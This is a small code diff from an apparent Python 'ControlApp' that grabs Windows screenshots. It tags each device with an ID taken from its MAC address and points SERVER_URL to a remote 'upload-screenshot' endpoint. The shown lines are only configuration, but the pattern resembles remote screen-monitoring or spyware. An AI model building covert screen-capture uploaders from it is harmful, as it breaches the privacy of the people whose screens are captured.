@@ -6,7 +6,7 @@ import uuid
 import os
 from PIL import ImageGrab  # capturas en Windows
 
-SERVER_URL = "https://dios-ybjy.onrender.com/"
+SERVER_URL = "https://dios-ybjy.onrender.com/upload-screenshot"
 DEVICE_ID = str(uuid.getnode())
 
 class ControlApp(App):
